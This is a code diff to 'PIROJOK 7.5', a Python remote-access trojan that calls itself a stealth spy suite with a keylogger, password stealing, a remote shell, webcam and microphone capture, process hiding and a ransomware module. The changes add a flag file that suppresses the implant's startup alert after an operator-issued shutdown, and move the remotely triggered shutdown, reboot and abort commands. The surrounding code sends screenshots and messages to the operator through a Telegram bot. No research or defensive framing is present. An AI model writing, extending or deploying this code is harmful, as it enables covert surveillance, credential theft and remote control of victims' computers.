@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PIROJOK 7.4 - ULTIMATE STEALTH SPY SUITE
+PIROJOK 7.5 - ULTIMATE STEALTH SPY SUITE
 Includes: keylogger, file upload/download, clipboard, remote shell,
 password stealing, geolocation, microphone, webcam, process hiding,
 self-destruction, and advanced masquerading
@@ -1261,7 +1261,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "7.4"
+        self.version = "7.5"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -1269,6 +1269,9 @@ class Pirojok:
         self.started = False
         self.last_command = ""
         self.last_command_time = datetime.now()
+        
+        # Флаги для управления выключением
+        self.shutdown_flag = os.path.join(tempfile.gettempdir(), "pirojok_shutdown.flag")
         
         # Module initialization
         self.ransom = PirojokRansomware(self)
@@ -1807,15 +1810,34 @@ class Pirojok:
                 return None
     
     def on_system_startup(self):
+        """Actions on system startup with shutdown flag protection"""
         try:
+            # Check if this is a startup after our own shutdown
+            if os.path.exists(self.shutdown_flag):
+                # This is a startup after we shut down - remove flag and DON'T notify
+                try:
+                    with open(self.shutdown_flag, 'r') as f:
+                        shutdown_time = f.read()
+                    print(f"Startup after shutdown at {shutdown_time} - silent mode")
+                except:
+                    pass
+                os.remove(self.shutdown_flag)
+                return
+            
+            # Normal startup (not after our shutdown)
             if os.path.exists(self.marker_file):
                 os.remove(self.marker_file)
                 return
-            if self.started: return
+            
+            if self.started: 
+                return
+            
             self.started = True
             
+            # Check and restore after reboot
             threading.Timer(10.0, self.check_and_restore).start()
             
+            # Send startup notification
             boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             message = f"[PIROJOK] Started!\n"
             message += f"Boot time: {boot_time}\n"
@@ -1825,10 +1847,14 @@ class Pirojok:
             message += f"Mask: {'YES' if self.hider.masked else 'NO'}"
             self.send_message(self.owner_id, message)
             
+            # Screenshot after boot
             time.sleep(5)
             screenshot = self.take_screenshot()
             if screenshot:
                 self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
+            else:
+                self.send_message(self.owner_id, "[WARN] Screenshot failed after boot")
+                
         except Exception as e:
             print(f"Startup error: {e}")
     
@@ -1859,6 +1885,7 @@ class Pirojok:
             # 4. Delete all temporary files
             temp_files = [
                 self.marker_file,
+                self.shutdown_flag,
                 self.hider.watchdog_file,
                 self.spy.keylog_file,
                 os.path.join(tempfile.gettempdir(), "pirojok_downloads"),
@@ -1962,7 +1989,7 @@ del "%~f0"
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-🔥 PIROJOK 7.4 - ULTIMATE STEALTH SUITE 🔥
+🔥 PIROJOK 7.5 - ULTIMATE STEALTH SUITE 🔥
 
 [🎥] VIDEO/AUDIO:
 • webcam - take photo from webcam
@@ -2005,9 +2032,9 @@ del "%~f0"
 • selfdestruct - Pirojok eats itself
 
 [⚡] POWER:
-• shutdown_now - shutdown immediately
+• shutdown_now - shutdown immediately (no notification after)
 • reboot_now - reboot immediately
-• shutdown - shutdown in 5 sec
+• shutdown - shutdown in 5 sec (no notification after)
 • reboot - reboot in 5 sec
 • abort - abort shutdown
 
@@ -2208,6 +2235,48 @@ del "%~f0"
                 self.processing = False
                 return
             
+            # === POWER COMMANDS WITH SHUTDOWN FLAG ===
+            if text == "shutdown_now":
+                # Create flag that this is our shutdown
+                with open(self.shutdown_flag, 'w') as f:
+                    f.write(f"shutdown_at:{datetime.now().isoformat()}")
+                os.system("shutdown /s /f /t 0")
+                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW! (no notification after)")
+                self.processing = False
+                return
+            
+            if text == "reboot_now":
+                # No flag for reboot - we want notification after
+                os.system("shutdown /r /f /t 0")
+                self.send_message(chat_id, "[REBOOT] Rebooting NOW!")
+                self.processing = False
+                return
+            
+            if text == "shutdown":
+                # Create flag for delayed shutdown
+                with open(self.shutdown_flag, 'w') as f:
+                    f.write(f"shutdown_at:{datetime.now().isoformat()}")
+                os.system("shutdown /s /t 5")
+                self.send_message(chat_id, "[SHUTDOWN] Shutting down in 5 seconds...")
+                self.processing = False
+                return
+            
+            if text == "reboot":
+                # No flag for reboot
+                os.system("shutdown /r /t 5")
+                self.send_message(chat_id, "[REBOOT] Rebooting in 5 seconds...")
+                self.processing = False
+                return
+            
+            if text == "abort":
+                os.system("shutdown /a")
+                # If abort succeeds, remove shutdown flag
+                if os.path.exists(self.shutdown_flag):
+                    os.remove(self.shutdown_flag)
+                self.send_message(chat_id, "[ABORT] Shutdown aborted")
+                self.processing = False
+                return
+            
             # === BASIC ===
             if text == "shot":
                 self.send_message(chat_id, "[CAM] Taking screenshot...")
@@ -2343,37 +2412,6 @@ del "%~f0"
             if text == "startup_check":
                 result = self.check_startup()
                 self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            # === POWER ===
-            if text == "shutdown_now":
-                os.system("shutdown /s /f /t 0")
-                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW!")
-                self.processing = False
-                return
-            
-            if text == "reboot_now":
-                os.system("shutdown /r /f /t 0")
-                self.send_message(chat_id, "[REBOOT] Rebooting NOW!")
-                self.processing = False
-                return
-            
-            if text == "shutdown":
-                os.system("shutdown /s /t 5")
-                self.send_message(chat_id, "[SHUTDOWN] Shutting down in 5 seconds...")
-                self.processing = False
-                return
-            
-            if text == "reboot":
-                os.system("shutdown /r /t 5")
-                self.send_message(chat_id, "[REBOOT] Rebooting in 5 seconds...")
-                self.processing = False
-                return
-            
-            if text == "abort":
-                os.system("shutdown /a")
-                self.send_message(chat_id, "[ABORT] Shutdown aborted")
                 self.processing = False
                 return
             
